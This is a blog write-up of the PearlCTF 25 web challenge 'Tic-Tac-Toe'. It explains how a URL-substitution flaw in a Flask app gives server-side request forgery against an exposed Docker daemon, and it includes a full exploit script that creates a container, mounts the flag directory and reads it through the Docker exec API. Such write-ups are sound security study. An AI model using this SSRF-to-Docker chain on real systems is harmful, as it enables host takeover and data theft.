<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>PearlCTF 25 - Web/Tic-Tac-Toe | hxuu</title><meta name=keywords content="ctf,write-up,pearl"><meta name=description content="CTF write-up for Ttt"><meta name=author content="hxuu"><link rel=canonical href=https://hxuu.github.io/blog/ctf/pearl25/tic-tac-toe/><link crossorigin=anonymous href=/blog/assets/css/stylesheet.e44f33264f033f576c3ce7f772762cc751d91ddb02aaa170e312a8aff988c2e6.css integrity="sha256-5E8zJk8DP1dsPOf3cnYsx1HZHdsCqqFw4xKor/mIwuY=" rel="preload stylesheet" as=style><link rel=icon href=https://hxuu.github.io/blog/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://hxuu.github.io/blog/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://hxuu.github.io/blog/favicon-32x32.png><link rel=apple-touch-icon href=https://hxuu.github.io/blog/apple-touch-icon.png><link rel=mask-icon href=https://hxuu.github.io/blog/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://hxuu.github.io/blog/ctf/pearl25/tic-tac-toe/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://hxuu.github.io/blog/ctf/pearl25/tic-tac-toe/"><meta property="og:site_name" content="hxuu"><meta property="og:title" content="PearlCTF 25 - Web/Tic-Tac-Toe"><meta property="og:description" content="CTF write-up for Ttt"><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="ctf"><meta property="article:published_time" content="2025-03-08T22:13:34+01:00"><meta property="article:modified_time" content="2025-03-08T22:13:34+01:00"><meta property="article:tag" content="Ctf"><meta property="article:tag" content="Write-Up"><meta property="article:tag" content="Pearl"><meta property="og:image" content="https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="PearlCTF 25 - Web/Tic-Tac-Toe"><meta name=twitter:description content="CTF write-up for Ttt"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Ctfs","item":"https://hxuu.github.io/blog/ctf/"},{"@type":"ListItem","position":2,"name":"PearlCTF 25 - Web/Tic-Tac-Toe","item":"https://hxuu.github.io/blog/ctf/pearl25/tic-tac-toe/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"PearlCTF 25 - Web/Tic-Tac-Toe","name":"PearlCTF 25 - Web\/Tic-Tac-Toe","description":"CTF write-up for Ttt","keywords":["ctf","write-up","pearl"],"articleBody":" Challenge attachments and code here\n1. Challenge overview After starting the instance of the challenge, we’re faced with what looks like a tic tac toe game over a web front. As we can see below, we can deploy and ping the game server, then click on the squares to send an HTTP request to the game server containing our game state.\nSince the UI doesn’t give away much of the web application’s logic, let’s dive into the source code to see how the latter works, namely, what endpoints are there and which of those can we tamper with.\nMy approach in analyzing code is having a top to bottom approach. I start with the Dockerfile, move to application main logic, then utilities if they exist.\nDockerfile FROM python:3.9-alpine RUN apk add --no-cache docker-cli WORKDIR /app COPY requirements.txt . RUN pip install -r requirements.txt COPY ./templates ./templates COPY app.py . COPY url.py . COPY flag.txt /flag/ ENV DOCKER_HOST=\"tcp://localhost:2375\" ENV GAME_API_DOMAIN=\"localhost\" ENV GAME_API_PORT=\"8000\" CMD [\"gunicorn\", \"--bind\", \"0.0.0.0:80\", \"app:app\", \"--capture-output\", \"--log-level\", \"debug\"] As you can see, we start with a alpine linux image that has python installed. Move our application code inside the container, and the flag.txt file into /flag/ directory.\nWe set few environment variables and run the application. Funnily enough, during the CTF, I didn’t know what the DOCKER_HOST env variable meant, but as you’ll see, it’ll be our main attack vector.\napp.py from flask import Flask, render_template, request, jsonify import requests, json import url import subprocess import logging app = Flask(__name__) logging.basicConfig(level=logging.DEBUG) logger = logging.getLogger(__name__) def wrap_response(resp): try: parsed = json.loads(resp) except json.JSONDecodeError: parsed = resp return {\"body\": parsed} @app.route(\"/\") def home(): return render_template(\"index.html\") @app.route(\"/deploy\") def deploy(): container_inspect = subprocess.run([\"docker\", \"inspect\", \"game\"], stdout=subprocess.PIPE) resp = json.loads(container_inspect.stdout) if len(resp) \u003e 0: return jsonify({\"status\": 1}) docker_cmd = [\"docker\", \"run\", \"--rm\", \"-d\", \"-p\", \"8000:8000\", \"--name\", \"game\", \"b3gul4/tic-tac-toe\"] subprocess.run(docker_cmd) return jsonify({\"status\": 0}) @app.route(\"/\") def game(): return render_template(\"index.html\") @app.post(\"/\") def play(): game = url.get_game_url(request.json) if game[\"error\"]: return jsonify({\"body\": {\"error\": game[\"error\"]}}) try: if game[\"action\"] == \"post\": resp = requests.post(game[\"url\"], json=request.json) if resp.status_code \u003c 200 or resp.status_code \u003e= 300: logger.debug(resp.text) return jsonify({\"body\": {\"error\": \"there was some error in game server\"}}) else: resp = requests.get(game[\"url\"]) if resp.status_code \u003c 200 or resp.status_code \u003e= 300: logger.debug(resp.text) return jsonify({\"body\": {\"error\": \"there was some error in game server\"}}) except Exception as e: return jsonify({\"body\": {\"error\": \"game server down\"}}) return jsonify(wrap_response(resp.text)) if __name__ == \"__main__\": app.run(host=\"0.0.0.0\", port=5000, debug=True) This is a Flask application that has 2 endpoints: root (/) and /deploy.\n/deploy: The code here creates the game docker container. At first, it checks whether a docker container by the name game is existant or not. Then, it runs a container based off of b3gul4/tic-tac-toe image. It should be noted that docker-cli was installed in the Dockerfile, that’s why we can run commands inside the container.\nroot (/): This one is interesting. Unlike the deploy endpoint which we can’t control. It seems like the / endpoint accepts a POST request which ultimately (after url checking) visits a url that is supplied by us. Now we start to get an idea of how the application works. We can MAYBE make requests, but first we have to overcome the line of defense put by the application. Let’s check url.py\nurl.py import os URL = \"http://:/\" def is_valid_state(state): if len(state) != 9: return False for s in state: if s not in [\"X\", \"O\", \"_\"]: return False return True def get_game_url(req_json): try: api = req_json[\"api\"] keys = list(api.keys()) url = URL.replace(\"\", os.getenv(\"GAME_API_DOMAIN\")) url = url.replace(\"\", os.getenv(\"GAME_API_PORT\")) # The game api is going to have many more endpoints in future, I do not want to hardcode the action url = url.replace(keys[0], api[keys[0]]) if not is_valid_state(req_json[\"state\"]): return {\"url\": None, \"action\": None, \"error\": \"Invalid state\"} return {\"url\": url, \"action\": req_json[\"action\"], \"error\": None} except Exception as e: print(e) return {\"url\": None, \"action\": None, \"error\": \"Internal server error\"} The function get_game_url (the one in app.py) attempts to sanitize our user input. It does so as follows:\ntakes input like this: { 'api': X, 'state': Y, 'action': Z } extracts a list of keys from the api. This suggests that X is actually an object of key-value pairs. like this: { \"api\": { \"key1\": \"value1\", \"key2\": \"value2\"...etc }, \"state\": Y, \"action\": Z } After that, it crafts a url from http://:/ by doing a series of substitutions as follows:\n3.1. replace and with predefined values (not very useful to us)\n3.2. replace key1 with value1 from our input json!!!\nNow THIS, is very interesting. We can tamper with the URL however we want. Say:\nurl = http://localhost:8000/ and\nkey1 = localhost:8000/ and value1 = example.com The generated url is http://example.com. Completely controllable by us!\nIs this enough though? Well, not quite so, we need to ensure that ‘state’ verifies the condition put as well. That’s easy, just set it to 9 Os or 9 Xs\n{ \"api\": { \"key1\": \"value1\", \"key2\": \"value2\"...etc }, \"state\": \"XXXXXXXXX\", \"action\": \"get\" //or post if we want to trigger the post section of the request handler } This way, we can make requests yes, but how can we retrieve the flag?\nHere comes the DOCKER_HOST environment variable.\nDocker is an containerization technology, ie not quite like VM, but behaves in a way that makes the processes running inside the container isolated from the host machine.\nThe process responsible for managing all of this is the docker daemon, better known as dockerd. It’s a persistent background process that acts as a runtime that manages docker objects, ie images, containers…etc.\nDocker dameon listens for REST API requests, which are HTTP requests, and as we know, HTTP is built on top of TCP, and where does the latter word appear in our application? That’s right! in the Dockerfile:\nENV DOCKER_HOST=\"tcp://localhost:2375\" How is this information useful you ask? Well, let’s say that exposing your docker daemon brings deamons. The kind that lets us interact with the host machine and create, start, stop, execute any docker command we like.\n2. Task Analysis The challenge overview was long I know, but now we know what we have to do. Since we think that dockerd is exposed through the network, we first should make an HTTP request to http://localhost:2375/info to verify our assumption.\nimport requests url = 'http://localhost:80' # url = 'https://tic-tac-toe-c8ae075ea3c02b7e.ctf.pearlctf.in' payload = { 'api': {\"8000/\": \"2375/info\"}, 'state': \"_________\", 'action': 'get', } info = requests.post(url, json=payload).json() print(info) I’ll leave the burden of understand my script to you. You have all the pieces you need.\nNice! We confirmed our assumption. We can move to the next step, which is retrieving the flag.\nTo get the flag, the simplest we can do is create a container using the already existing image. Mout the host filesystem into this newly created container, and just cat-ing out the flag.txt file.\n3. Solution All the steps mentioned above are below on this script:\nsolve.py #!/usr/bin/env python3 import requests url = 'http://localhost:80' # url = 'https://tic-tac-toe-c8ae075ea3c02b7e.ctf.pearlctf.in' # step 0: create a new container that the flag.txt is mounted on payload = { 'state': \"_________\", 'api': {\"8000/\": \"2375/containers/create\"}, 'action': 'post', \"Image\": \"b3gul4/tic-tac-toe\", \"HostConfig\": { \"Binds\": [\"/flag:/flag:ro\"] } } container_info = requests.post(url, json=payload).json() container_id = container_info['body']['Id'] print(container_id) # step 1.0: start the container payload = { 'state': \"_________\", 'api': {\"8000/\": f\"2375/containers/{container_id}/restart\"}, 'action': 'post', } start_data = requests.post(url, json=payload).json() print(start_data) # exit() # # step 1.1: check if it's up (optional) # payload = { # 'state': \"_________\", # 'api': {\"8000/\": f\"2375/containers/{container_id}/logs?stdout=true\u0026stderr=true\"}, # 'action': 'get', # } # containers = requests.post(url, json=payload).json() # print(containers) # exit() # container_id = containers['body'][0]['Id'] # print(container_id) print('==========================================================') # step 2: create an exec session to get the flag # wished payload: {\"AttachStdout\": True, \"AttachStderr\": True, \"Tty\": False, \"Cmd\": [\"cat\", \"/flag/flag.txt\"]} payload = { 'state': \"_________\", 'api': {\"8000/\": f\"2375/containers/{container_id}/exec\"}, 'action': 'post', \"AttachStdout\": True, \"AttachStderr\": True, \"Tty\": False, \"Cmd\": [\"cat\", \"/flag/flag.txt\"] } exec_data = requests.post(url, json=payload).json() # print(exec_data.json()) exec_id = exec_data['body']['Id'] # print(exec_id) # exit() print('==========================================================') # step 3: start the session to actually get the flag # wished payload: {\"Detach\": False, \"Tty\": False} payload = { 'state': \"_________\", 'api': {\"8000/\": f\"2375/exec/{exec_id}/start\"}, 'action': 'post', \"Detach\": False, \"Tty\": False } resp = requests.post(url, json=payload) # flag = extract_flag(resp) # Assuming 'response' holds the raw output print(resp.json()) # This should print the actual flag And there we go~ Flag is: pearl{do_y0u_r34llY_kn0w_d0ck3r_w3ll?}\nIf you’re interested in learning more about the challenge, here are some additional reads:\nContainer Vulnerabilities|Part 2 Attacker’s Tactics and Techniques in Unsecured Docker Daemons Revealed What is Docker? dockerd Configure remote access for Docker daemon ","wordCount":"1408","inLanguage":"en","image":"https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2025-03-08T22:13:34+01:00","dateModified":"2025-03-08T22:13:34+01:00","author":{"@type":"Person","name":"hxuu"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://hxuu.github.io/blog/ctf/pearl25/tic-tac-toe/"},"publisher":{"@type":"Organization","name":"hxuu","logo":{"@type":"ImageObject","url":"https://hxuu.github.io/blog/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://hxuu.github.io/blog/ accesskey=h title="hxuu (Alt + H)"><img src=https://hxuu.github.io/apple-touch-icon.png alt aria-label=logo height=35>hxuu</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://hxuu.github.io/blog/ctf/ title=CTFs><span>CTFs</span></a></li><li><a href=https://hxuu.github.io/blog/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://hxuu.github.io/blog/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://github.com/hxuu title="About Me"><span>About Me</span>&nbsp;
<svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://hxuu.github.io/blog/>Home</a>&nbsp;»&nbsp;<a href=https://hxuu.github.io/blog/ctf/>Ctfs</a></div><h1 class="post-title entry-hint-parent">PearlCTF 25 - Web/Tic-Tac-Toe</h1><div class=post-description>CTF write-up for Ttt</div><div class=post-meta><span title='2025-03-08 22:13:34 +0100 CET'>March 8, 2025</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;hxuu&nbsp;|&nbsp;<a href=https://github.com/hxuu/content/ctf/pearl25/tic-tac-toe.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#1-challenge-overview>1. Challenge overview</a><ul><li><a href=#dockerfile><code>Dockerfile</code></a></li><li><a href=#apppy><code>app.py</code></a></li><li><a href=#urlpy><code>url.py</code></a></li></ul></li><li><a href=#2-task-analysis>2. Task Analysis</a></li><li><a href=#3-solution>3. Solution</a><ul><li><a href=#solvepy><code>solve.py</code></a></li></ul></li></ul></nav></div></details></div><div class=post-content><p><img alt=challenge-description loading=lazy src=/blog/images/2025-03-09-21-56-22.png>
Challenge attachments and code <a href=https://pearlctf.in/files/tic-tac-toe.zip>here</a></p><h2 id=1-challenge-overview>1. Challenge overview<a hidden class=anchor aria-hidden=true href=#1-challenge-overview>#</a></h2><p>After starting the instance of the challenge, we&rsquo;re faced with what looks like a tic tac toe
game over a web front. As we can see below, we can deploy and ping the game server, then click on
the squares to send an HTTP request to the game server containing our game state.</p><p><img alt=ping loading=lazy src=/blog/images/2025-03-09-23-37-51.png></p><p><img alt=state loading=lazy src=/blog/images/2025-03-09-23-38-20.png></p><p>Since the UI doesn&rsquo;t give away much of the web application&rsquo;s logic, let&rsquo;s dive into the source code
to see how the latter works, namely, what endpoints are there and which of those can we tamper with.</p><blockquote><p>My approach in analyzing code is having a top to bottom approach. I start with the <code>Dockerfile</code>,
move to application main logic, then utilities if they exist.</p></blockquote><hr><h3 id=dockerfile><code>Dockerfile</code><a hidden class=anchor aria-hidden=true href=#dockerfile>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-Dockerfile data-lang=Dockerfile><span class=line><span class=cl><span class=k>FROM</span><span class=s> python:3.9-alpine</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> apk add --no-cache docker-cli<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>WORKDIR</span><span class=s> /app</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> requirements.txt .<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> pip install -r requirements.txt<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> ./templates ./templates<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> app.py .<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> url.py .<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> flag.txt /flag/<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>ENV</span> <span class=nv>DOCKER_HOST</span><span class=o>=</span><span class=s2>&#34;tcp://localhost:2375&#34;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>ENV</span> <span class=nv>GAME_API_DOMAIN</span><span class=o>=</span><span class=s2>&#34;localhost&#34;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>ENV</span> <span class=nv>GAME_API_PORT</span><span class=o>=</span><span class=s2>&#34;8000&#34;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>CMD</span> <span class=p>[</span><span class=s2>&#34;gunicorn&#34;</span><span class=p>,</span> <span class=s2>&#34;--bind&#34;</span><span class=p>,</span> <span class=s2>&#34;0.0.0.0:80&#34;</span><span class=p>,</span> <span class=s2>&#34;app:app&#34;</span><span class=p>,</span> <span class=s2>&#34;--capture-output&#34;</span><span class=p>,</span> <span class=s2>&#34;--log-level&#34;</span><span class=p>,</span> <span class=s2>&#34;debug&#34;</span><span class=p>]</span><span class=err>
</span></span></span></code></pre></div><p>As you can see, we start with a alpine linux image that has python installed. Move
our application code inside the container, and the flag.txt file into /flag/ directory.</p><p>We set few environment variables and run the application. Funnily enough, during the CTF,
I didn&rsquo;t know what the <code>DOCKER_HOST</code> env variable meant, but as you&rsquo;ll see, it&rsquo;ll be our main
attack vector.</p><h3 id=apppy><code>app.py</code><a hidden class=anchor aria-hidden=true href=#apppy>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>render_template</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>jsonify</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span><span class=o>,</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>url</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>logging</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>logging</span><span class=o>.</span><span class=n>basicConfig</span><span class=p>(</span><span class=n>level</span><span class=o>=</span><span class=n>logging</span><span class=o>.</span><span class=n>DEBUG</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>logger</span> <span class=o>=</span> <span class=n>logging</span><span class=o>.</span><span class=n>getLogger</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>wrap_response</span><span class=p>(</span><span class=n>resp</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>parsed</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>resp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>json</span><span class=o>.</span><span class=n>JSONDecodeError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>parsed</span> <span class=o>=</span> <span class=n>resp</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>{</span><span class=s2>&#34;body&#34;</span><span class=p>:</span> <span class=n>parsed</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>home</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;index.html&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/deploy&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>deploy</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>container_inspect</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>([</span><span class=s2>&#34;docker&#34;</span><span class=p>,</span> <span class=s2>&#34;inspect&#34;</span><span class=p>,</span> <span class=s2>&#34;game&#34;</span><span class=p>],</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>resp</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>container_inspect</span><span class=o>.</span><span class=n>stdout</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>resp</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s2>&#34;status&#34;</span><span class=p>:</span> <span class=mi>1</span><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>docker_cmd</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;docker&#34;</span><span class=p>,</span> <span class=s2>&#34;run&#34;</span><span class=p>,</span> <span class=s2>&#34;--rm&#34;</span><span class=p>,</span> <span class=s2>&#34;-d&#34;</span><span class=p>,</span> <span class=s2>&#34;-p&#34;</span><span class=p>,</span> <span class=s2>&#34;8000:8000&#34;</span><span class=p>,</span> <span class=s2>&#34;--name&#34;</span><span class=p>,</span> <span class=s2>&#34;game&#34;</span><span class=p>,</span> <span class=s2>&#34;b3gul4/tic-tac-toe&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>docker_cmd</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s2>&#34;status&#34;</span><span class=p>:</span> <span class=mi>0</span><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>game</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;index.html&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.post</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>play</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>game</span> <span class=o>=</span> <span class=n>url</span><span class=o>.</span><span class=n>get_game_url</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>json</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>game</span><span class=p>[</span><span class=s2>&#34;error&#34;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s2>&#34;body&#34;</span><span class=p>:</span> <span class=p>{</span><span class=s2>&#34;error&#34;</span><span class=p>:</span> <span class=n>game</span><span class=p>[</span><span class=s2>&#34;error&#34;</span><span class=p>]}})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>game</span><span class=p>[</span><span class=s2>&#34;action&#34;</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;post&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>resp</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>game</span><span class=p>[</span><span class=s2>&#34;url&#34;</span><span class=p>],</span> <span class=n>json</span><span class=o>=</span><span class=n>request</span><span class=o>.</span><span class=n>json</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>resp</span><span class=o>.</span><span class=n>status_code</span> <span class=o>&lt;</span> <span class=mi>200</span> <span class=ow>or</span> <span class=n>resp</span><span class=o>.</span><span class=n>status_code</span> <span class=o>&gt;=</span> <span class=mi>300</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>logger</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>resp</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s2>&#34;body&#34;</span><span class=p>:</span> <span class=p>{</span><span class=s2>&#34;error&#34;</span><span class=p>:</span> <span class=s2>&#34;there was some error in game server&#34;</span><span class=p>}})</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>resp</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>game</span><span class=p>[</span><span class=s2>&#34;url&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>resp</span><span class=o>.</span><span class=n>status_code</span> <span class=o>&lt;</span> <span class=mi>200</span> <span class=ow>or</span> <span class=n>resp</span><span class=o>.</span><span class=n>status_code</span> <span class=o>&gt;=</span> <span class=mi>300</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>logger</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>resp</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s2>&#34;body&#34;</span><span class=p>:</span> <span class=p>{</span><span class=s2>&#34;error&#34;</span><span class=p>:</span> <span class=s2>&#34;there was some error in game server&#34;</span><span class=p>}})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s2>&#34;body&#34;</span><span class=p>:</span> <span class=p>{</span><span class=s2>&#34;error&#34;</span><span class=p>:</span> <span class=s2>&#34;game server down&#34;</span><span class=p>}})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>jsonify</span><span class=p>(</span><span class=n>wrap_response</span><span class=p>(</span><span class=n>resp</span><span class=o>.</span><span class=n>text</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s2>&#34;0.0.0.0&#34;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>5000</span><span class=p>,</span> <span class=n>debug</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span></code></pre></div><p>This is a Flask application that has 2 endpoints: root (/) and /deploy.</p><ol><li>/deploy: The code here creates the game docker container. At first, it checks whether a docker
